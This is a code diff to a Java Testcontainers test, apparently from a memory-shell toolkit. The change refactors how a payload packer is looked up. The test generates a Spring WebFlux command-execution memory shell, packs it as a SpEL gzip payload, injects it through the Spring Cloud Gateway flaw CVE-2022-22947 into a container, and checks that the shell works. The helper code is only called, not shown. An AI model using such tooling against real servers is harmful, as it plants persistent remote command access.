@@ -27,6 +27,7 @@ import org.testcontainers.junit.jupiter.Testcontainers;
 import java.time.Duration;
 
 import static org.junit.jupiter.api.Assertions.assertNotEquals;
+import com.reajason.javaweb.memshell.PackerRegistry;
 
 @Testcontainers
 @Slf4j
@@ -45,7 +46,7 @@ public class CVE202222947Test {
         String url = getUrl();
         String shellType = ShellType.SPRING_WEBFLUX_WEB_FILTER;
         String shellTool = ShellTool.Command;
-        Packers packer = Packers.SpELSpringGzip;
+        String packer = Packers.SpELSpringGzip;
         Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
         ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
         MemShellResult generateResult = ShellAssertion.generate(
@@ -58,7 +59,7 @@ public class CVE202222947Test {
                 shellToolConfig,
                 packer);
 
-        String content = packer.getInstance().pack(ClassPackerConfig.from(generateResult));
+        String content = PackerRegistry.getInstance().get(packer).pack(ClassPackerConfig.from(generateResult));
         injectBySpringCloudGateway(url, content);
         ShellAssertion.assertShellIsOk(generateResult, urls.getLeft(), shellTool, shellType, null, null);
     }
